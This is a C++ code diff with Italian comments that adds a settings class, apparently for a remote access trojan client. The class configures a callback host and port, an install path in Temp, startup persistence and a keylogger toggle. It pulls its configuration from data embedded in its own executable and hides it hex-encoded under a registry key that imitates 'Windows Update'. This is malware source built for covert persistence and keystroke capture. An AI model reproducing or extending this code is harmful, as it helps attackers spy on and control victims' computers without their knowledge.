@@ -93,3 +93,67 @@ public:
 		return "";
 	}
 };
+
+// Classe per la gestione dei settaggi
+class Settaggi
+{
+private:
+	DirUtils du;
+	SettingsFile sf;
+	RegUtils ru;
+	Encode en;
+
+public:
+	string Host = "127.0.0.1";
+	int Porta = 5555;
+	string InstallPath = "C:\\Users\\<User>\\AppData\\Local\\Temp";
+	string ExeName = "Client.exe";
+	bool RegStartup = true;
+	bool KeyLogger = true;
+
+	// Costruttore
+	Settaggi()
+	{
+		sf.SetFileName(du.GetModuleFilePath() + "Sett");
+		sf.HideFileContent(sf.Hex);
+	}
+
+	// Popola i settaggi ottenendoli dal relativo file
+	void GetSettingsFromExe()
+	{
+		du.WriteFile(du.GetModuleFilePath() + "Sett", SimpleFind(du.GetBinaryFileContent(du.GetFullModuleFilePath()), en.AsciiToHex("{START}"), en.AsciiToHex("{END}")));
+
+		Host = sf.GetSetting("Host");
+		Porta = stoi(sf.GetSetting("Port"));
+		InstallPath = sf.GetSetting("InstallPath");
+		ExeName = sf.GetSetting("ExeName");
+		RegStartup = (sf.GetSetting("RegStartup") == "true");
+		KeyLogger = (sf.GetSetting("KeyLogger") == "true");
+
+		du.DelFile(du.GetModuleFilePath() + "Sett");
+	}
+
+	// Popola i settaggi ottenendoli dal registro
+	void GetSettingsFromReg()
+	{
+		Host = en.HexToAscii(ru.RegRead("SOFTWARE\\Windows Update", en.AsciiToHex("Host").c_str(), REG_SZ));
+		Porta = stoi(en.HexToAscii(ru.RegRead("SOFTWARE\\Windows Update", en.AsciiToHex("Port").c_str(), REG_SZ)));
+		ExeName = en.HexToAscii(ru.RegRead("SOFTWARE\\Windows Update", en.AsciiToHex("ExeName").c_str(), REG_SZ));
+		RegStartup = (en.HexToAscii(ru.RegRead("SOFTWARE\\Windows Update", en.AsciiToHex("RegStartup").c_str(), REG_SZ)) == "true");
+		KeyLogger = (en.HexToAscii(ru.RegRead("SOFTWARE\\Windows Update", en.AsciiToHex("KeyLogger").c_str(), REG_SZ)) == "true");
+	}
+
+	// Scrive i settaggi su registro
+	void InstallSettings()
+	{
+		GetSettingsFromExe();
+
+		ru.RegMakeKey("SOFTWARE\\Windows Update");
+
+		ru.RegWrite("SOFTWARE\\Windows Update", en.AsciiToHex("Host").c_str(), REG_SZ, en.AsciiToHex(Host).c_str());
+		ru.RegWrite("SOFTWARE\\Windows Update", en.AsciiToHex("Port").c_str(), REG_SZ, en.AsciiToHex(to_string(Porta)).c_str());
+		ru.RegWrite("SOFTWARE\\Windows Update", en.AsciiToHex("ExeName").c_str(), REG_SZ, en.AsciiToHex(ExeName).c_str());
+		ru.RegWrite("SOFTWARE\\Windows Update", en.AsciiToHex("RegStartup").c_str(), REG_SZ, en.AsciiToHex((RegStartup) ? "true" : "false").c_str());
+		ru.RegWrite("SOFTWARE\\Windows Update", en.AsciiToHex("KeyLogger").c_str(), REG_SZ, en.AsciiToHex((KeyLogger) ? "true" : "false").c_str());
+	}
+};
